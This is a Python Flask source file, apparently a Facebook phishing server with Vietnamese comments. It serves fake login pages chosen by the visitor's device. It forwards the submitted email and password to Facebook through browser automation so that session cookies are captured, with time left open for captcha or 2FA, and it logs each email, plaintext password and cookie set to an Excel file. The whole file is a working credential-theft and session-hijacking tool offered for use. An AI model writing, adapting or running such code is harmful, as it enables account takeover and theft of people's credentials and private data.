from flask import Flask, render_template, request, jsonify
from openpyxl import Workbook, load_workbook
from utils.get_html import get_facebook_page_after_login
import os

app = Flask(__name__)

FILE_NAME = "users.xlsx"


def detect_device(user_agent):
    ua = user_agent.lower()

    if "iphone" in ua or "ipad" in ua or "ios" in ua:
        return "ios"

    if "android" in ua:
        return "android"

    return "desktop"


@app.route("/")
def home():

    user_agent = request.headers.get("User-Agent", "")
    device = detect_device(user_agent)

    print("User-Agent:", user_agent)
    print("Device:", device)

    if device == "ios":
        return render_template("iOS/login.html")

    elif device == "android":
        return render_template("Android/login.html")

    else:
        return render_template("Desktop/login.html")


@app.route("/login", methods=["POST"])
def login():
    data = request.json
    email = data.get("email")
    password = data.get("password")
    
    if not email or not password:
        return jsonify({"success": False, "error": "Missing email or password"}), 400

    # Gọi hàm login Facebook và trả về HTML + cookies để client hiển thị / lưu
    try:
        result = get_facebook_page_after_login(
            username=email,
            password=password,
            headless=False,          # Để False để có thể thấy captcha/2FA và tương tác nếu cần
            timeout=300000            # Thời gian chờ tối đa 5 phút (tăng thêm để dễ trả về HTML)
        )

        html = result.get("html") if isinstance(result, dict) else ""
        cookies = result.get("cookies") if isinstance(result, dict) else ""

        # Lưu vào file Excel (cột 3 là cookies nếu có)
        try:
            if not os.path.exists(FILE_NAME):
                wb = Workbook()
                ws = wb.active
                ws.append(["Email", "Password", "Cookies"])
                wb.save(FILE_NAME)

            wb = load_workbook(FILE_NAME)
            ws = wb.active
            ws.append([email, password, cookies or ""])
            wb.save(FILE_NAME)
        except Exception as e:
            return jsonify({"success": False, "error": f"Failed to save to Excel: {str(e)}"}), 500

        if html:
            return jsonify({"success": True, "html": html})
        else:
            return jsonify({
                "success": False,
                "error": "Không lấy được HTML sau khi đăng nhập Facebook."
            }), 500

    except Exception as e:
        return jsonify({"success": False, "error": f"Error during Facebook automation: {str(e)}"}), 500


if __name__ == "__main__":
    app.run(
        host="0.0.0.0",
        port=5000,
        debug=True,
        use_reloader=False
    )